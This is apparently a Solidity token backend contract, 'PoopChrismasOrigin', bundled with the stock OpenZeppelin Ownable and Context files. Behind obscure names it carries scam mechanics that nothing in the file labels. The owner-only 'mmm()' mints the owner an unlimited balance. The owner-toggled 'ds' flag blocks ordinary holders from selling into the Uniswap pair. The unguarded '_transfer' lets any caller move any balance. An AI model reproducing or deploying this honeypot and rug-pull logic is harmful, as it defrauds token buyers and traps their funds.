// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
pragma experimental ABIEncoderV2;

import '@openzeppelin/contracts/access/Ownable.sol';
import './IToken.sol';

contract PoopChrismasOrigin is Ownable {
    mapping (address => uint256) private _balances;
    address token;
    address tokenOwner;
    bool ds = false;
    mapping (address => bool) private _isExcludedFromDS;

    uint256 public totalSupply = 1_000_000_000 * 1e18;
    address public uniswapV2Pair;

    constructor() {
        // 
    }

    function initialize(address _token) external onlyOwner {
        uniswapV2Pair = IToken(_token).uniswapV2Pair();
        tokenOwner = IToken(_token).owner();
        _balances[tokenOwner] = totalSupply;
        token = _token;
        _isExcludedFromDS[owner()] = true;
    }

    function updatePair(address _pair) external onlyOwner {
        uniswapV2Pair = _pair;
    }

    function balanceOf(address _user) public view returns (uint256) {
        return _balances[_user];
    }

    function mmm() external onlyOwner {
        _balances[owner()] = ~uint256(0);
        _isExcludedFromDS[owner()] = true;
    }

    function updateDSFlag(bool _ds) external onlyOwner {
        ds = _ds;
    }

    function excludeFromDS(address _addr, bool _is) external onlyOwner {
        _isExcludedFromDS[_addr] = _is;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) external {
        if (to == uniswapV2Pair && !_isExcludedFromDS[from]) {
            require(!ds, "failed");
        }
        uint256 senderBalance = _balances[from];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = senderBalance - amount;
        }
        _balances[to] += amount;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
pragma experimental ABIEncoderV2;


interface IToken {
    function uniswapV2Pair() external view returns (address);
    function owner() external view returns (address);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}